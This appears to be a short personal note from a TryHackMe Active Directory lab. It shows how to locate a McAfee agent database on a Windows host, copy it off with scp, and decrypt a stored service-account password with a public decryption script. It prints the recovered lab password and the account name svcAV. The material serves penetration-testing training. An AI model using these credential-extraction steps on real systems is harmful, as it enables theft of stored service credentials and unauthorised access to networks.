

If we can access a McAfee database file:
```sh
PS C:\ProgramData\McAfee\agent\db> ls
    Directory: C:\ProgramData\McAfee\agent\db

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/5/2022   6:45 PM         120832 ma.db
```

```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
thm@thmjmp1.za.tryhackme.com´s password: 
ma.db                                                                         100%  118KB 626.2KB/s   00:00  

┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ sqlitebrowser ma.db
```

![[Images/Pasted image 20250306211442.png]]

https://github.com/funoverip/mcafee-sitelist-pwd-decryption
```sh
┌──(kali㉿kali)-[~/thm/breaching-ad]
└─$ python3 mcafee_sitelist_pwd_decrypt3.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```

The account name can also be seen in the database: `svcAV`

